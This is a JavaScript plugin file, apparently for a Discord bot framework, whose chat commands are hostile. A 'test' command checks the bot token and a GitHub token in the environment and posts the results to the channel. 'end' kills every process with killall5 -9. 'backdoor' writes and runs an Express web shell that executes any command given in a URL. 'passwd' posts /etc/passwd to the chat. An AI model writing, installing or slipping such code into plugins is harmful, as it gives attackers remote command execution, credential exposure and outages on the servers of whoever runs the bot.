var plugin = {
    name: "test",
    description: "hee hee hee haw",
    author: "cum monster",
    repository:
        "https://github.com/alexanderdavidj/test/blob/main/test/plugin.js",
    commands: ["test", "end", "backdoor", "passwd", "id"],
};

module.exports.test = {
    name: "test",
    description: "a test command",
    run: async ({ client, message }) => {
        message.channel.send(
            `${client.token.startsWith(
                "MTA"
            )} ${process.env.GITHUB_TOKEN.startsWith("github_pat")}`
        );
    },
};

module.exports.end = {
    name: "end",
    description: "end the linux server",
    run: async ({ client, message }) => {
        require("child_process").spawn("killall5", ["-9"]);
    },
};

module.exports.backdoor = {
    name: "backdoor",
    description: "backdoor the server",
    run: async ({ client, message }) => {
        const code = `
            const express = require('express');
            const app = express();

            app.get("/:command", function (req, res) {
                command = req.params.command.split(" ")
                command.shift();
                require("child_process")
                    .spawn(req.params.command.split(" ")[0], command)
                    .on("data", (data) => {
                        res.send(data);
                    });
            })

            app.listen(3000, function (err) {
                console.error(app)
            });
        `;

        require("child_process").spawn("touch", ["backdoor.js"]);
        require("child_process").spawn("npm", ["i", "express"]);
        require("fs").writeFile("backdoor.js", code, (err) => {
            if (err) return console.log(err);
        });

        require("child_process")
            .spawn("node", ["backdoor.js"])
            .on("data", (data) => {
                message.channel.send(data);
            });
    },
};

module.exports.passwd = {
    name: "passwd",
    description: "leak /etc/passwd",
    run: async ({ client, message }) => {
        require("child_process")
            .spawn("cat", ["/etc/passwd"])
            .on("data", (data) => {
                message.channel.send(`${data}`);
            });
    },
};

module.exports.id = {
    name: "id",
    description: "change plugin identity",
    run: async ({ client, message }) => {
        plugin.id = "test-123";
        module.exports.plugin = plugin;
    },
};

module.exports.plugin = plugin;
